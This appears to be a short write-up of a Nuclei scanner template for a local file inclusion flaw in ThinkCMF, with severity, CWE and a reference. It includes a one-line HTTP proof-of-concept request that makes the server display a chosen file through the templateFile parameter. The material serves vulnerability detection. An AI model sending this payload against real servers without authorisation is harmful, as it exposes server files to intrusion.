# Nuclei Template: ThinkCMF - Local File Inclusion
**Template ID:** thinkcmf-lfi
**Vulnerability Class:** Relative Path Traversal
**Severity:** High
**CWE:** CWE-23
**Source:** Nuclei Template (`thinkcmf-lfi.yaml`)

## Vulnerability Information & PoC

## Description
ThinkCMF is vulnerable to local file inclusion.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/?a=display&templateFile=README.md
```

## References
- https://www.freebuf.com/vuls/217586.html
